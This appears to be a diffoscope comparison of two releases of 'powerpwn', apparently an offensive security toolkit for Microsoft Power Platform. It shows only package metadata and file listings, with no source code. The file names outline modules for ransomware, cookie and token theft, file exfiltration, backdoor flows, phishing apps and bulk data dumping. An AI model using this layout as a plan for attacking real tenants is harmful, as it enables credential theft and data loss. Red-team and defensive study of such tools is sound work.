# Comparing `tmp/powerpwn-2.1.4.tar.gz` & `tmp/powerpwn-2.1.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "powerpwn-2.1.4.tar", last modified: Thu Dec  7 08:09:06 2023, max compression
+gzip compressed data, was "powerpwn-2.1.5.tar", last modified: Thu Apr 18 20:24:32 2024, max compression
```

## Comparing `powerpwn-2.1.4.tar` & `powerpwn-2.1.5.tar`

### file list

```diff
@@ -1,135 +1,135 @@
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.956652 powerpwn-2.1.4/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      678 2023-12-07 08:09:06.941633 powerpwn-2.1.4/PKG-INFO
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1590 2023-12-07 08:09:06.964839 powerpwn-2.1.4/setup.cfg
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       73 2023-07-24 10:03:36.000000 powerpwn-2.1.4/setup.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:01.537959 powerpwn-2.1.4/src/
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.404444 powerpwn-2.1.4/src/powerpwn/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:04.711790 powerpwn-2.1.4/src/powerpwn/cli/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 06:41:41.000000 powerpwn-2.1.4/src/powerpwn/cli/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     8798 2023-08-17 12:56:52.000000 powerpwn-2.1.4/src/powerpwn/cli/arguments.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       49 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/cli/const.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5029 2023-08-17 12:56:52.000000 powerpwn-2.1.4/src/powerpwn/cli/runners.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:04.664447 powerpwn-2.1.4/src/powerpwn/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1399 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/enums/str_enum.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1347 2023-08-17 12:56:52.000000 powerpwn-2.1.4/src/powerpwn/main.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:02.118092 powerpwn-2.1.4/src/powerpwn/nocodemalware/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.483054 powerpwn-2.1.4/src/powerpwn/nocodemalware/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      231 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/enums/code_exec_type_enum.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      311 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/enums/command_to_run_enum.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6005 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/malware_runner.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:07.082762 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      947 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/any_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      455 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/cleanup_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      555 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/cmd_arguments.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1601 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/cmd_results.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      454 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/code_exec_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      435 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/code_exec_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       96 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/command_args_properties_base_model.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      295 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/exflirtate_file_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      465 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/exflirtate_file_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      574 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/ransomware_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      444 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/ransomware_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      305 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/steal_cookie_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      453 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/steal_cookie_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      509 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/nocodemalware/models/steal_power_automate_token_command_args.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.357186 powerpwn-2.1.4/src/powerpwn/powerdoor/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3765 2023-07-28 07:22:48.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/backdoor_flow.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      311 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/create_flow_model.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:04.664447 powerpwn-2.1.4/src/powerpwn/powerdoor/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      233 2023-07-28 07:20:23.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/enums/action_type.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      126 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/enums/flow_state.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1845 2023-07-28 07:22:29.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/flow_factory_installer.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.047362 powerpwn-2.1.4/src/powerpwn/powerdoor/samples/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/samples/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)    23081 2023-07-27 21:35:53.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/samples/flow_factory_to_install.json
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2579 2023-07-24 10:03:36.000000 powerpwn-2.1.4/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:03.043805 powerpwn-2.1.4/src/powerpwn/powerdump/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:03.075047 powerpwn-2.1.4/src/powerpwn/powerdump/collect/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:03.203096 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:03.294762 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3485 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:04.173527 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1577 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2507 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6158 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1767 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     7120 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4139 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5868 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3777 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3897 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3934 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_documentdb.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4330 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1389 2023-08-17 12:56:52.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/data_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:04.350536 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      132 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_source.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      280 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_type.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      211 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/idata_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:04.993761 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      756 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/base_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      524 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/base_validator.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      477 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/canvas_app_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1293 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/connection_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2047 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/connector_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      674 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/data_dump_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      781 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/data_record_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1027 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/data_store_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      496 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/data_store_validator.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      507 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/principal_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      370 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/resource_entity_base.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:05.269953 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3424 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/_api.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4945 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4689 2023-07-28 07:22:48.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2721 2023-07-28 07:22:48.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:05.348513 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      202 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/enums/resource_type.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      707 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/iresource_collector.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2659 2023-07-28 07:22:48.000000 powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:05.473940 powerpwn-2.1.4/src/powerpwn/powerdump/gui/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1859 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/gui.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4434 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/prep.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.119863 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       73 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1422 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/base.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1127 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/canvasapps_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1711 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/connections_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      983 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/connectors_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      303 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/json_object.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1523 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/logic_flows_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1129 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/resources_table.html
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.798512 powerpwn-2.1.4/src/powerpwn/powerdump/utils/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4778 2023-09-12 12:11:56.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/auth.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      375 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/const.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4593 2023-07-28 07:22:48.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/json_utils.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6085 2023-08-17 12:56:52.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/model_loaders.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1107 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/path_utils.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3124 2023-07-28 07:22:48.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/requests_wrapper.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1098 2023-07-27 11:45:05.000000 powerpwn-2.1.4/src/powerpwn/powerdump/utils/token_cache.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.893632 powerpwn-2.1.4/src/powerpwn/powerphishing/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerphishing/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     8772 2023-07-30 13:50:57.000000 powerpwn-2.1.4/src/powerpwn/powerphishing/app_installer.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-12-07 08:09:06.941633 powerpwn-2.1.4/src/powerpwn.egg-info/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      678 2023-12-07 08:09:00.000000 powerpwn-2.1.4/src/powerpwn.egg-info/PKG-INFO
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6197 2023-12-07 08:09:01.000000 powerpwn-2.1.4/src/powerpwn.egg-info/SOURCES.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        1 2023-12-07 08:09:00.000000 powerpwn-2.1.4/src/powerpwn.egg-info/dependency_links.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       48 2023-12-07 08:09:00.000000 powerpwn-2.1.4/src/powerpwn.egg-info/entry_points.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      332 2023-12-07 08:09:00.000000 powerpwn-2.1.4/src/powerpwn.egg-info/requires.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        9 2023-12-07 08:09:00.000000 powerpwn-2.1.4/src/powerpwn.egg-info/top_level.txt
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.285068 powerpwn-2.1.5/
+-rw-r--r--   0 mbg        (501) staff       (20)      741 2024-04-18 20:24:32.284927 powerpwn-2.1.5/PKG-INFO
+-rw-r--r--   0 mbg        (501) staff       (20)     1642 2024-04-18 20:24:32.285745 powerpwn-2.1.5/setup.cfg
+-rw-r--r--   0 mbg        (501) staff       (20)       69 2024-04-18 05:32:57.000000 powerpwn-2.1.5/setup.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.220685 powerpwn-2.1.5/src/
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.226249 powerpwn-2.1.5/src/powerpwn/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/__init__.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.230290 powerpwn-2.1.5/src/powerpwn/cli/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/cli/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     8910 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/cli/arguments.py
+-rw-r--r--   0 mbg        (501) staff       (20)       47 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/cli/const.py
+-rw-r--r--   0 mbg        (501) staff       (20)     6915 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/cli/runners.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.231567 powerpwn-2.1.5/src/powerpwn/enums/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/enums/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1359 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/enums/str_enum.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1563 2024-04-18 20:14:12.000000 powerpwn-2.1.5/src/powerpwn/main.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.232240 powerpwn-2.1.5/src/powerpwn/nocodemalware/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/__init__.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.233314 powerpwn-2.1.5/src/powerpwn/nocodemalware/enums/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/enums/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)      220 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/enums/code_exec_type_enum.py
+-rw-r--r--   0 mbg        (501) staff       (20)      301 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/enums/command_to_run_enum.py
+-rw-r--r--   0 mbg        (501) staff       (20)     5886 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/malware_runner.py
+drwxr-xr-x   0 mbg        (501) staff       (20)        0 2024-04-18 20:24:32.240620 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/
+-rw-r--r--   0 mbg        (501) staff       (20)        0 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/__init__.py
+-rw-r--r--   0 mbg        (501) staff       (20)      926 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/any_command_args.py
+-rw-r--r--   0 mbg        (501) staff       (20)      446 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/cleanup_command_args.py
+-rw-r--r--   0 mbg        (501) staff       (20)      542 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/cmd_arguments.py
+-rw-r--r--   0 mbg        (501) staff       (20)     1543 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/cmd_results.py
+-rw-r--r--   0 mbg        (501) staff       (20)      445 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/code_exec_args_properties.py
+-rw-r--r--   0 mbg        (501) staff       (20)      426 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/code_exec_command_args.py
+-rw-r--r--   0 mbg        (501) staff       (20)       91 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/command_args_properties_base_model.py
+-rw-r--r--   0 mbg        (501) staff       (20)      288 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/exflirtate_file_args_properties.py
+-rw-r--r--   0 mbg        (501) staff       (20)      456 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/exflirtate_file_command_args.py
+-rw-r--r--   0 mbg        (501) staff       (20)      565 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/ransomware_args_properties.py
+-rw-r--r--   0 mbg        (501) staff       (20)      435 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/ransomware_command_args.py
+-rw-r--r--   0 mbg        (501) staff       (20)      298 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/steal_cookie_args_properties.py
+-rw-r--r--   0 mbg        (501) staff       (20)      444 2024-04-18 05:32:57.000000 powerpwn-2.1.5/src/powerpwn/nocodemalware/models/steal_cookie_command_args.py
